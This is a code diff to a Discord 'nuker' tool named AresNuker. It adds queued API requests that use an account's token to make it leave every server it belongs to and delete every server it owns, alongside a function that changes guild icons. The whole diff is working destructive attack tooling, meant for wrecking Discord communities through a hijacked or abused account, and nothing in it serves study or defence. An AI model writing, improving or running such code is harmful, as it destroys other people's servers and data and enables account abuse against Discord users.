@@ -1,8 +1,10 @@
 __import__('sys').path.append('../')
 import global_vars, requests, json
 from AresNuker import Console
-from .get_all_guilds import _GetAllGuilds
+from .get_all_guilds import _GetAllGuilds, _GetAllGuildsUser
+from .requests_maker import GetQ
 
+q = GetQ()
 console = Console()
 headers = global_vars.headers
 headers_account = global_vars.headers_account
@@ -22,26 +24,24 @@ def ChangeIconGuild() -> None:
 	r = requests.patch(f"https://discord.com/api/v8/guilds/{guild_id}", headers = headers, data = json.dumps(payload))
 
 def LeaveGuilds() -> None:
-	guilds = _GetAllGuilds()
+	guilds = _GetAllGuildsUser()
 	payload = {'lurking': False}
 	for guild in guilds:
 		id = guild['id']
 		name = guild['name']
 		try:
-			r = requests.delete(f'https://discord.com/api/v8/users/@me/guilds/{id}', headers = headers_account, json = payload)
+			q.put((requests.delete, f'https://discord.com/api/v8/users/@me/guilds/{id}', headers_account, payload))
 			console.log(f'Left Server {name}')
 		except:
 			console.error(f'Unble to left server {name}')
 
 def DeleteGuilds() -> None:
-	guilds = _GetAllGuilds()
+	guilds = _GetAllGuildsUser()
 	for guild in guilds:
 		id = guild['id']
 		name = guild['name']
 		try:
-			r = requests.delete(f'https://discord.com/api/v8/guilds/{id}/', headers = headers_account)
-			console.debug(r.text)
-			input()
+			q.put((requests.delete, f'https://discord.com/api/v8/guilds/{id}', headers_account, None))
 			console.log(f'Deleted Server {name}')
 		except:
 			console.error(f'Unble to delete server {name}')
